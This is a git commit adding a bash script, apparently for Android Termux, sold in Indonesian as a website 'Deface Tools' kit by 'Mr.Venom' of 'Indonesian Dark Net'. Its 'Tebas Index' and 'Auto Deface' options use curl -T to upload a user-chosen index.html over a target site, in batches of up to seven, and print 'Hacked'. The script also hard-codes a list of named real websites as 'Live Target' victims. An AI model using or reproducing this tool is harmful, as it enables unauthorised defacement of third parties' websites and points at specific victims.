d35702a3ce1d2d8cf317be8190a7ca51ebd40b8a
Mr.venom <63120931+kozard2@users.noreply.github.com>
2020-05-02 08:48:12 +0700

    Add files via upload

---
+++ Defacer.sh
@@ -0,0 +1,315 @@
+#Mantul_coding
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+pkg install toilet -y
+bash jr.sh
+echo
+echo  $green
+echo "Loading.............";
+sleep 0.1;
+clear
+echo  $green
+echo 'Harap Bersabar.........................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading.................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Bersabar............................................';
+sleep 0.4;
+echo  $green
+echo "Loading..................................";
+sleep 0.1;
+clear
+echo  $green
+echo  'Harap Bersabar...............';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading................................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Bersabar...........................';
+sleep 0.1;
+echo  $green
+echo "Loading.........................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'Harap Bersabar....................................................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Bersabar............................................';
+sleep 0.1;
+echo  $green
+echo "Loading.....................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'Harap Bersabar.............................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading........................................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Bersabar........................';
+sleep 0.1;
+clear
+echo  $green
+echo "Loading.............................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'Harap Bersabar................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading.................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Bersabar...................................................';
+sleep 0.4;
+echo  $green
+echo "Loading....................................";
+sleep 0.1;
+clear
+echo  $green
+echo "Loading.............................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'Harap Bersabar................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading.................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Bersabar...................................................';
+sleep 0.4;
+echo  $green
+echo "Loading....................................";
+sleep 0.1;
+clear
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+toilet -f future "    Deface Tools" | lolcat
+echo
+echo $red"##########################$green" WELCOME "$red###########################"
+echo $yellow
+figlet -f future "Indonesian Dark Net"
+echo
+echo $red"##########################$green" WELCOME "$red###########################"
+echo
+echo $indigo"	~"$cyan"{"$white"A"$cyan"}"$green"."$yellow"Tebas Index"$cyan
+echo $indigo"        ~"$cyan"{"$white"B"$cyan"}"$green"."$yellow"Web Scan"$cyan
+echo $indigo"	~"$cyan"{"$white"C"$cyan"}"$green"."$yellow"Auto Deface"$cyan
+echo
+echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo
+echo $indigo"  +"$cyan"{"$white"T"$cyan"}"$purple"."$green"TUTORIAL & LIVE TARGET"$indigo"      +"$cyan"{"$white"I"$cyan"}"$green"Info"$indigo"      +"$cyan"{"$white"Q"$cyan"}"$green"Quit"$cyan
+echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo $indigo"=============================================================="
+echo
+echo $white "╭─"$yellow"Mr.Venom"$cyan" ~/IndoDarkNet"$white
+read -p " ╰─$ "  apaan
+echo
+if [ $apaan = "A" ] || [ $apaan = "a" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo
+toilet -f future "Deface Tebas Index" | lolcat
+echo
+echo $red "Simpan SC Di Memory Internal Di Luar Folder "
+echo
+echo $blue "Live Target"
+echo $white "http://contsol.co.za"
+echo $cyan "http://ayk.co.za"
+echo $white "http://handj.co.za"
+echo $cyan "http://chasingfantasia.com"
+echo $white "http://centraltech.co.za"
+echo $cyan "http://cblandscapes.co.za"
+echo $white "http://techdirect.co.za"
+echo
+echo
+echo $red "Eksekusi Target!!!"
+echo $green "╭─"$blue"Mr.Venom"$cyan" ~/IndoDarkNet"$white
+read -p " ╰─$ "  target
+echo
+echo $red "Masukan Script Cukk!!! "
+echo $green "╭─"$blue"Mr.venom"$cyan" ~/Nama SC Harus(index.html)"$white
+read -p " ╰─$ "  script
+curl -T /storage/emulated/0/$script $target
+echo $red "["$yellow"Hacked"$red"]"$cyan"～～～＞"$green" $target"
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "B" ] || [ $apaan = "b" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+cd Files
+php kamu.php
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "C" ] || [ $apaan = "c" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo $red
+toilet -f future "Auto Deface 7" | lolcat
+echo $cyan "Deface Masal Sebanyak 7 Web"
+echo
+echo $red"###"$yellow" ctrl + c to quit"$red" ###"
+echo
+echo
+echo
+echo "Masukan Script  Cukk!!!!"
+echo $white "╭─"$green"Mr.venom"$cyan" ~/IndoDarknet"$white                               
+read -p " ╰─$ " script
+echo
+echo
+echo $white"Masukan Target1 !!!!"
+echo $white "╭─"$green"Mr.venom"$cyan" ~/Gass"$white
+read -p " ╰─$ " target1
+curl -T /storage/emulated/0/$script $target1
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target1/$script"
+echo
+echo $white"Masukan Target2 !!!!"
+echo $white "╭─"$green"Mr.venom"$cyan" ~/IndoDarkNet"$white
+read -p " ╰─$ " target2
+curl -T /storage/emulated/0/$script $target2
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target2/$script"
+echo
+echo $white"Masukan Target3 !!!!"
+echo $white "╭─"$green"Mr.venom"$cyan" ~/Gass"$white
+read -p " ╰─$ " target3
+curl -T /storage/emulated/0/$script $target3
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target3/$script"
+echo
+echo $white"Masukan Target4 !!!!"
+echo $white "╭─"$green"Mr.venom"$cyan" ~/IndoDarkNet"$white
+read -p " ╰─$ " target4
+curl -T /storage/emulated/0/$script $target4
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target4/$script"
+echo
+echo $white"Masukan Target5 !!!!"
+echo $white "╭─"$green"Mr.venom"$cyan" ~/Gass"$white
+read -p " ╰─$ " target5
+curl -T /storage/emulated/0/$script $target5
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target5/$script"
+echo
+echo $white"Masukan Target6 !!!!"
+echo $white "╭─"$green"Mr.Venom"$cyan" ~/Gass"$white
+read -p " ╰─$ " target6
+curl -T /storage/emulated/0/$script $target6
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target6/$script"
+echo
+echo $white"Masukan Target7 !!!!"
+echo $white "╭─"$green"Mr.Venom"$cyan" ~/IndoDarkNet"$white
+read -p " ╰─$ " target7
+curl -T /storage/emulated/0/$script $target7
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target7/$script"
+echo
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "I" ] || [ $apaan = "i" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo
+toilet -f future "   Informasi Tools" | lolcat
+echo $red"##########################$green" WELCOME "$red###########################"
+echo $green"Author  : Awuu Zans /@Mr.Venom			"
+echo $green"Gthub   : https://github.com/Defacer-DarkNet"
+echo $red"Blog    : http://indonesiaanonymous.blogspot.com/2013/07/tool-deface-terbaru.html?m=1"
+echo
+echo $yellow"                          THANKS TO :"
+echo
+echo $cyan"[+] MR.404rgr  "
+echo $cyan"[+] Mr.Unknwon "
+echo $cyan"[+] Mr.Anonymous "
+echo $cyan"[+] MR.Eror_X & All Member [I.D.N] "
+echo $red"##########################$green" WELCOME "$red###########################"
+echo $indigo"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "T" ] || [ $apaan = "t" ]
+then
+cat tutorial.txt
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "Q" ] || [ $apaan = "q" ]
+then
+echo " Terima kasih Kawan Sudah Menggunakan Tools ini :D "
+exit
+clear
+fi
+
+
+if [ $back = "B" ] || [ $back = "b" ]
+then
+sh ICA.sh
+fi
+
+if [ $back = "Q" ] || [ $back = "q" ]
+then
+clear
+fi
